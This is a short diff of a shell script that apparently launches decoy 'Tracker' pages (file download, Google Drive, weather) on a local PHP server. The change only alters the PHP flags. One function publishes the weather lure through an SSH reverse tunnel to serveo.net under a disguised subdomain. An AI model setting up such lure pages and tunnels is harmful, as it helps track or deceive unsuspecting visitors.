@@ -46,7 +46,7 @@ filedownload(){
 
     echo "Starting PHP Server..."
     cd Tracker/filedownload
-    php -S 127.0.0.1:8000 >& /dev/null
+    php -q -S 127.0.0.1:8000
     
 }
 
@@ -61,7 +61,7 @@ gdrive(){
     echo "Starting PHP Server..."
     cd ../../..
     cd Tracker/gdrive
-    php -S 127.0.0.1:8000 >& /dev/null
+    php -q -S 127.0.0.1:8000
     
 }
 
@@ -69,7 +69,7 @@ weather(){
 
     echo "Starting PHP Server..."
     cd Tracker/weather
-    php -S 127.0.0.1:8000 >& /dev/null
+    php -q -S 127.0.0.1:8000
     echo "Starting serveo"
     ssh -R weatherfindersitex:80:127.0.0.1:8000 serveo.net
     echo "[+] Direct link: weatherfindersitex.serveo.net"
